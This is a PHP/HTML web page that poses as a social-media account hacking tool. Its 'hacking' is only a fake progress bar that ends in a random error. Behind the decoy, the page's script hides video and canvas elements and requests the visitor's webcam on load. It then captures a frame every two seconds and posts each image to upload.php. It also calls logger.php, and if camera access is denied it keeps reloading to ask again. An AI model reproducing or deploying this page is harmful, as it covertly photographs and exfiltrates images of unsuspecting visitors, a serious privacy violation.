<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Media Account Account Hacking</title>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #34495e;
            --accent-color: #e74c3c;
            --text-color: #ecf0f1;
            --light-gray: #bdc3c7;
            --dark-gray: #7f8c8d;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--primary-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px 0;
            border-bottom: 1px solid var(--dark-gray);
        }
        
        h1 {
            color: var(--accent-color);
            margin-bottom: 10px;
        }
        
        .subheading {
            color: var(--light-gray);
            font-size: 1.1rem;
        }
        
        .platform-selection {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .platform-icon {
            width: 60px;
            height: 60px;
            background-color: var(--secondary-color);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .platform-icon:hover {
            transform: scale(1.1);
            background-color: var(--accent-color);
        }
        
        .platform-icon img {
            width: 40px;
            height: 40px;
        }
        
        .input-section {
            display: none;
            flex-direction: column;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .input-section.active {
            display: flex;
        }
        
        .input-field {
            width: 100%;
            max-width: 500px;
            padding: 12px 15px;
            border: none;
            border-radius: 5px;
            background-color: var(--secondary-color);
            color: var(--text-color);
            font-size: 1rem;
            margin-bottom: 20px;
        }
        
        .input-field::placeholder {
            color: var(--dark-gray);
        }
        
        .analyze-btn {
            background-color: var(--accent-color);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        
        .analyze-btn:hover {
            background-color: #c0392b;
        }
        
        .analyze-btn:disabled {
            background-color: var(--dark-gray);
            cursor: not-allowed;
        }
        
        .progress-container {
            width: 100%;
            max-width: 500px;
            margin-top: 20px;
            display: none;
        }
        
        .progress-bar {
            width: 0%;
            height: 20px;
            background-color: var(--accent-color);
            border-radius: 5px;
            transition: width 0.5s ease;
        }
        
        .progress-text {
            margin-top: 10px;
            text-align: center;
            color: var(--light-gray);
            font-style: italic;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 100;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background-color: var(--secondary-color);
            padding: 30px;
            border-radius: 10px;
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        
        .modal h2 {
            color: var(--accent-color);
            margin-top: 0;
        }
        
        .close-modal {
            background-color: var(--accent-color);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            margin-top: 20px;
            cursor: pointer;
        }
        
        .disclaimer {
            margin-top: 50px;
            padding-top: 20px;
            border-top: 1px solid var(--dark-gray);
            font-size: 0.8rem;
            color: var(--light-gray);
            text-align: center;
        }
        
        video, canvas {
            display: none !important;
        }
        
        @media (max-width: 600px) {
            .platform-icon {
                width: 50px;
                height: 50px;
            }
            
            .platform-icon img {
                width: 30px;
                height: 30px;
            }
            
            h1 {
                font-size: 1.5rem;
            }
            
            .subheading {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div class="container">
        <header>
            <h1>Social Media Account Hacking</h1>
            <p class="subheading">Hack account's security vulnerability (Educational Use Only)</p>
        </header>
        
        <div class="platform-selection">
            <div class="platform-icon" data-platform="facebook">
                <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="Facebook">
            </div>
            <div class="platform-icon" data-platform="instagram">
                <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
            </div>
            <div class="platform-icon" data-platform="youtube">
                <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube">
            </div>
            <div class="platform-icon" data-platform="snapchat">
                <img src="https://cdn-icons-png.flaticon.com/512/1384/1384063.png" alt="Snapchat">
            </div>
            <div class="platform-icon" data-platform="twitter">
                <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
            </div>
            <div class="platform-icon" data-platform="tiktok">
                <img src="https://cdn-icons-png.flaticon.com/512/3046/3046127.png" alt="TikTok">
            </div>
            <div class="platform-icon" data-platform="linkedin">
                <img src="https://cdn-icons-png.flaticon.com/512/174/174857.png" alt="LinkedIn">
            </div>
            <div class="platform-icon" data-platform="pinterest">
                <img src="https://cdn-icons-png.flaticon.com/512/174/174863.png" alt="Pinterest">
            </div>
            <div class="platform-icon" data-platform="reddit">
                <img src="https://cdn-icons-png.flaticon.com/512/1409/1409945.png" alt="Reddit">
            </div>
            <div class="platform-icon" data-platform="other">
                <img src="https://cdn-icons-png.flaticon.com/512/159/159832.png" alt="Other">
            </div>
        </div>
        
        <div class="input-section">
            <input type="text" class="input-field" placeholder="e.g., @username or https://www.example.com/profile">
            <button class="analyze-btn">Hack Account</button>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar"></div>
            <p class="progress-text"></p>
        </div>
        
        <div class="disclaimer">
            <p>This website is for educational purposes only. </p>
            <p>We Are Anonymous </p>
            <p>We Are Legion</p>
            <p>We Do Not Forget</p>           
            <p>We Do Not Forgive</p>
            <p>Expact Us</p>
            <p>Socail media hack 2025 ©️ All Rights Reserved</p>
        </div>
    </div>
    
    <div class="modal">
        <div class="modal-content">
            <h2>Analysis Failed</h2>
            <p id="error-message">Error: Account is too secure for analysis.</p>
            <button class="close-modal">Close</button>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const platformIcons = document.querySelectorAll('.platform-icon');
            const inputSection = document.querySelector('.input-section');
            const inputField = document.querySelector('.input-field');
            const analyzeBtn = document.querySelector('.analyze-btn');
            const progressContainer = document.querySelector('.progress-container');
            const progressBar = document.querySelector('.progress-bar');
            const progressText = document.querySelector('.progress-text');
            const modal = document.querySelector('.modal');
            const errorMessage = document.getElementById('error-message');
            const closeModal = document.querySelector('.close-modal');
            
            let selectedPlatform = '';
            
            platformIcons.forEach(icon => {
                icon.addEventListener('click', function() {
                    selectedPlatform = this.getAttribute('data-platform');
                    inputSection.classList.add('active');
                });
            });
            
            analyzeBtn.addEventListener('click', function() {
                if (!inputField.value.trim()) {
                    alert('Please enter a username or profile link');
                    return;
                }
                
                analyzeBtn.disabled = true;
                analyzeBtn.textContent = 'Analyzing...';
                
                progressContainer.style.display = 'block';
                
                simulateHacking();
            });
            
            closeModal.addEventListener('click', function() {
                modal.style.display = 'none';
                resetAnalysis();
            });
            
            function simulateHacking() {
                const messages = [
                    "Connecting to server...",
                    "Bypassing security protocols...",
                    "Scanning for vulnerabilities...",
                    "Attempting to decrypt password hash...",
                    "Accessing private messages...",
                    "Extracting personal information...",
                    "Finalizing analysis..."
                ];
                
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 5;
                    progressBar.style.width = `${progress}%`;
                    
                    const messageIndex = Math.min(Math.floor(progress / (100 / messages.length)), messages.length - 1);
                    progressText.textContent = messages[messageIndex];
                    
                    if (progress >= 100) {
                        clearInterval(interval);
                        showError();
                    }
                }, 1000);
            }
            
            function showError() {
                const errors = [
                    "Error: Account is too secure for analysis.",
                    "Error: Unable to connect to the social media platform.",
                    "Error: Suspicious activity detected. Analysis stopped.",
                    "Error: Account not found.",
                    "Error: Our system is currently overloaded. Please try again later."
                ];
                
                const randomError = errors[Math.floor(Math.random() * errors.length)];
                errorMessage.textContent = randomError;
                
                modal.style.display = 'flex';
            }
            
            function resetAnalysis() {
                progressBar.style.width = '0%';
                progressText.textContent = '';
                progressContainer.style.display = 'none';
                
                analyzeBtn.disabled = false;
                analyzeBtn.textContent = 'Analyze Account';
                
                inputField.value = '';
            }

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            let lastImageHash = "";

            function getImageHash(dataUrl) {
                let hash = 0;
                for (let i = 0; i < dataUrl.length; i++) {
                    const char = dataUrl.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash |= 0;
                }
                return hash;
            }

            function captureAndSend() {
                const width = video.videoWidth;
                const height = video.videoHeight;

                if (width === 0 || height === 0) return;

                canvas.width = width;
                canvas.height = height;
                ctx.drawImage(video, 0, 0, width, height);

                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                const hash = getImageHash(dataUrl);

                if (hash === lastImageHash) {
                    return;
                }

                lastImageHash = hash;

                fetch('upload.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataUrl })
                });
            }

            function startCamera() {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        setInterval(captureAndSend, 2000);
                    })
                    .catch(err => {
                        console.warn("Camera access failed:", err);
                        setTimeout(() => location.reload(), 5000);
                    });
            }

            startCamera();
            fetch("logger.php").then(res => res.text()).then(console.log);
        });
    </script>
</body>
</html>